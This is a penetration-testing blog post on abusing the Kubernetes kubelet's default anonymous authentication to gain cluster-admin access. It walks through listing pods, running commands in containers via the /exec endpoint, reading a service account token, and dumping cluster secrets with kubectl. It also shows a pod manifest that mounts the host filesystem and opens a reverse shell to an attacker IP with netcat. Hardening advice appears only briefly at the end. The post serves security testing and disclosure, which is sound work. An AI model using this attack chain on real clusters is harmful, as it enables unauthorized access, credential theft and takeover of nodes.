---
layout: post
title: "kubelet: anonymous to cluster-admin"
date: 2019-01-09T23:08:55+00:00
author: alxk
sitemap: false
keywords: "kubelet kubernetes pentesting cluster-admin api hacking"
description: "Abusing the kubelet default configuration to gain access to the kube-apiserver."
---

# kubelet: anonymous to cluster-admin

This post will cover abusing the `kubelet` default configuration to gain privileged access to the `kube-apiserver` on a Kubernetes cluster. This can also lead to code execution on the nodes.

## Architecture Overview

The image below shows a high-level overview of Kubernetes' architecture:

![kubernetes architecture](https://alex.kaskaso.li/images/posts/kubernetes-architecture.png "kubernetes architecture"){: .center-image width="80%" border="1px solid black" }

The inner workings of Kubernetes are quite involved and this article will not discuss them in detail. As a brief overview of the relevant bits:

* Human administrators talk to the "API Server" on a master node. The canonical name for this service is `kube-apiserver` and communication is done over a RESTful API (usually abstracted with the CLI tool `kubectl`).
* Communication between the `kube-apiserver` on the master and `kubelet` services on the worker nodes is bi-directional. This communication also happens over REST APIs.
* "Pods" (logical groupings of one or more containers) run on the worker nodes. The `kube-apiserver` holds the information that allows each `kubelet` to determine what it should be running.

Authentication between the various components is ideally done over mutual TLS.

However, each pod is assigned a Service Account by default; the Service Account in question and the extent of the privileges are configurable. These service accounts allow various services to interact with the `kube-apiserver` by using a `Bearer` token.

## Objective and Environment

Attackers may wish to gain authenticated access the `kube-apiserver`. This could allow them to, for example, read secrets or gain access to services in the cluster. This can also lead to code execution on the underlying node machines, facilitating wider lateral movement.

For this scenario, we will assume that administrative authentication to the `kube-apiserver` is properly secured using mutual TLS authentication. Due to a lack of network segregation in the setup, the `kubelet` APIs on the worker nodes are accessible to an attacker over the network.

The `kubelet` service usually runs on port 10250/TCP.

## Default kubelet Authentication

The Kubernetes [documentation](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) states that `kubelet` defaults to a mode that allows anonymous authentication:

```
--anonymous-auth
	Enables anonymous requests to the Kubelet server. Requests that are not
        rejected by another authentication method are treated as anonymous
        requests. Anonymous requests have a username of system:anonymous,
        and a group name of system:unauthenticated. (default true)
```

Anonymous authentication provides full access to the `kubelet` API, the only requirement being network access to the service.

## kubelet API

While the `kubelet` API is not documented, it's straightforward to `grep` the [source](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) for available endpoints. These include:

* `/pods` - lists running pods
* `/exec` - runs a command in a container and returns a link to view the output.

Other API endpoints not relevant to this post allow port forwarding, fetching logs and viewing metrics.

### Getting Pods

A simple GET request to `/pods` will list pods and their containers:

```
$ curl -ks https://10.1.2.3:10250/pods | jq '.'
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "tiller-797d1b1234-gb6qt",
        "generateName": "tiller-797d1b1234-",
        "namespace": "kube-system",
      ...
      "spec": {
        "containers": [
          {
            "name": "tiller",
            "image": "x/tiller:2.5.1",
            "ports": [
              {
                "name": "tiller",
                "containerPort": 44134,
                "protocol": "TCP"
              }
            ],
        "serviceAccountName": "tiller",
        "serviceAccount": "tiller",
    ...
    },
    ...
  ]
}
```

### Running Commands in Containers

A template request to run a command in a container is shown below:

```
$ curl -Gks https://worker:10250/exec/{namespace}/{pod}/{container} \
  -d 'input=1' -d 'output=1' -d 'tty=1'                               \
  -d 'command=ls' -d 'command=/tmp'
```

It should be noted that the `command` is passed as an array (split by spaces) and that the above is a GET request.

Target `{namespace}`, `{pod}` and `{container}` values can be obtained from the `/pods` endpoint as shown in the previous section. For example, to run `ls /tmp` in the `tiller` container the request would be:

```
$ curl -Gks https://worker:10250/exec/kube-system/tiller-797d1b1234-gb6qt/tiller \
  -d 'input=1' -d 'output=1' -d 'tty=1'                                            \
  -d 'command=ls' -d 'command=/tmp'

<a href="/cri/exec/CLgtq03G">Found</a>.
```

The request returns 302 redirect with a link to a stream that should be read with a websocket.

The author's [`kubelet-anon-rce`](https://github.com/serain/kubelet-anon-rce) script automates issuing a command and streaming the response:

```
$ python3 kubelet-anon-rce.py           \
          --node worker                 \
          --namespace kube-system       \
          --pod tiller-797d1b1234-gb6qt \
          --container tiller            \
          --exec "ls /tmp"

...
```

## Obtaining Service Account Tokens

The Kubernetes [documentation](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) states that pods are assigned a Service Account by default:

```
When you create a pod, if you do not specify a service account,
it is automatically assigned the default service account in the
same namespace. [...]

You can access the API from inside a pod using automatically
mounted service account credentials, as described in Accessing
the Cluster. The API permissions of the service account depend
on the authorization plugin and policy in use.
```

Following the ["Accessing the Cluster"](https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#accessing-the-api-from-a-pod) link shows that tokens are mounted at the following path:

```
/var/run/secrets/kubernetes.io/serviceaccount/token
```

The token for the `tiller` Service Account can thus be retrieved by using the `kubelet` API `/exec` endpoint to print it out:

```
$ python3 kubelet-anon-rce.py           \
          --node worker                 \
          --namespace kube-system       \
          --pod tiller-797d1b1234-gb6qt \
          --container tiller            \
          --exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token"

<TOKEN>
```

## kube-apiserver Authentication

The token can be used to authenticate to the `kube-apiserver` API. This service will usually listen on 6443/TCP on master nodes.

Interaction with the API through `curl` is straightforward:

```
$ curl -ks -H "Authorization: Bearer <TOKEN>" \
  https://master:6443/api/v1/namespaces/{namespace}/secrets
```

A more elegant solution is to use `kubectl` directly:

```
$ kubectl --insecure-skip-tls-verify=true  \
          --server="https://master:6443"   \
          --token="<TOKEN>"                \
          get secrets --all-namespaces -o json
```

These sample requests fetch Base64 encoded secrets used in the cluster.

Note that because of differences in HTTP headers that the `kube-apiserver` expects to see, it may be necessary to download a version of `kubectl` that matches the target Kubernetes cluster. The cluster's version can be obtained by hitting the `/version` endpoint. The corresponding binary can then be fetched by modifying the version in the request below:

```
curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.X.X/bin/linux/amd64/kubectl
```

## Access to the Nodes

Access to an underlying node's filesystem can be obtained by mounting the node's root directory into a container deployed in a pod.

The following deployment, `node-access.yaml`, mounts the host node's filesystem to `/host` in a container that spawns a reverse shell back to an attacker:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test
spec:
  containers:
  - name: busybox
    image: busybox:1.29.2
    command: ["/bin/sh"]
    args: ["-c", "nc 10.4.4.4 4444 -e /bin/sh"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

This can be deployed with the following command:

```
$ kubectl --insecure-skip-tls-verify=true  \
          --server="https://master:6443"   \
          --token="<TOKEN>"                \
          deploy -f node-access.yaml
```

While not technically RCE on the node, a remote containerized shell with access to the filesystem will in many cases lead to RCE.

It should be noted that with the method above, the attacker has no direct control over which node in the cluster he will gain access to as the Kubernetes Scheduler will allocate the pod to a node based on resource usage at that point.

## Privileges and Privilege Escalation

The `tiller` pod attacked in this scenario is a good target to get a token with high privileges on the `kube-apiserver` as Tiller is a component of Helm, a package manager for Kubernetes.

Given the nature of the service, Tiller requires high privileges and the [Helm docs suggest assigning the `cluster-admin` role](https://github.com/helm/helm/blob/master/docs/rbac.md#tiller-and-role-based-access-control) to its Service Account.

If a high-privileged Service Account is not available, an attacker may consider obtaining any token with "create pod" privileges in a given namespace. The attacker could then proceed to create pods with any other target Service Account token from the namespace mounted, thus gaining those privileges. Alternatively tokens with the desired privileges, such as "read secrets", may be readily available.

The `rbac.authorization.k8s.io` API can provide a lot of information about roles and service accounts available in given namespaces:

```
$ curl -ks https://master:6443/apis/rbac.authorization.k8s.io/
```

## Recommendations

The `kubelet` service should be run with `--anonymous-auth false` and the service should be segregated at the network level.

It is also recommended to ensure that all Service Accounts have the least privileges needed for their tasks.
